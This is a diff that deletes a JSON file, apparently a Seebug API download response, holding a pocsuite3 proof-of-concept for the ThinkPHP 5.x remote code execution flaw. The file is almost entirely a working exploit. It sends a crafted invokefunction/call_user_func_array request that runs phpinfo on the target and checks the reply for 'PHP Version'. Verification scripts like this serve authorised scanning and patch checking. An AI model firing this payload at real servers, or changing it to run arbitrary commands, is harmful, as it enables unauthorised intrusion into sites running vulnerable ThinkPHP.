@@ -1,8 +1,0 @@
-{
-    "status": "success",
-    "msg": "下载成功",
-    "data": {
-        "ssvid": 99617,
-        "poc": "from pocsuite3.api import Output, POCBase, register_poc, requests\n\nclass ThinkPHP_RCE(POCBase):\n    vulID = '99617'\n    version = '1.0'\n    author = ['seebug']\n    vulDate = '2018-12-10'\n    createDate = '2024-01-15'\n    updateDate = '2024-01-15'\n    name = 'ThinkPHP 5.x RCE'\n    appName = 'ThinkPHP'\n    appVersion = '5.x'\n    vulType = 'RCE'\n    desc = 'ThinkPHP 5.x 远程代码执行漏洞'\n    \n    def _verify(self):\n        result = {}\n        url = self.url.rstrip('/')\n        payload = '/index.php?s=/Index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'\n        \n        try:\n            response = requests.get(url + payload, timeout=10)\n            if 'PHP Version' in response.text:\n                result['VerifyInfo'] = {}\n                result['VerifyInfo']['URL'] = url\n                result['VerifyInfo']['Payload'] = payload\n                return self.parse_output(result)\n        except:\n            pass\n        return self.parse_output(result)\n\nregister_poc(ThinkPHP_RCE)\n"
-    }
-}
